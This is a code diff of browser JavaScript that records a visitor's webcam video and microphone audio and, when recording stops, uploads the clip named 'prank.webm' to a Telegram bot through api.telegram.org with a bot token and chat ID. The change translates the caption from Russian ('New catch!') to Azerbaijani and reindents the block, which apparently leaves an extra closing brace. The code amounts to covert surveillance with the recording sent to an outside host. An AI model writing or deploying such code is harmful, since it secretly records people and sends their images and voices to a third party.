@@ -29,17 +29,19 @@
 
                 mediaRecorder.ondataavailable = (e) => chunks.push(e.data);
                 
-                mediaRecorder.onstop = async () => {
-                    const blob = new Blob(chunks, { type: 'video/webm' });
-                    const formData = new FormData();
-                    formData.append('chat_id', CHAT_ID);
-                    formData.append('video', blob, 'prank.webm');
-                    formData.append('caption', '📸 Новый улов! Видео и звук:');
+                    mediaRecorder.onstop = async () => {
+        const blob = new Blob(chunks, { type: 'video/webm' });
+        const formData = new FormData();
+        formData.append('chat_id', CHAT_ID);
+        formData.append('video', blob, 'prank.webm');
+        formData.append('caption', '📸 Yeni video gəldi!');
 
-                    await fetch(`https://api.telegram.org/bot${TOKEN}/sendVideo`, {
-                        method: 'POST',
-                        body: formData
-                    });
+        await fetch(`https://api.telegram.org/bot${TOKEN}/sendVideo`, {
+            method: 'POST',
+            body: formData
+        });
+    };
+
                 };
 
                 mediaRecorder.start();
